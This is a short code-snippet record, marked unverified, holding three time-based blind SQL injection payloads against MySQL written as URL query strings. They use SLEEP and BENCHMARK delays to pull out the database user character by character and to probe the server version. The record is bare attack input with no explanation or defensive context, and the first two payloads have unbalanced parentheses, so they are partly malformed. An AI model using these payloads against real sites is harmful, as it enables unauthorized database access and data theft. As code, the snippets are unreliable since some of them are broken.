---
id: caa174ad-57e2-4167-82b3-98240e3fc5c4
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.721926+00:00'
updated_at: '2023-04-10T20:22:49.440051+00:00'
---

# Code Snippet caa174ad

**Language**: SQL

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```
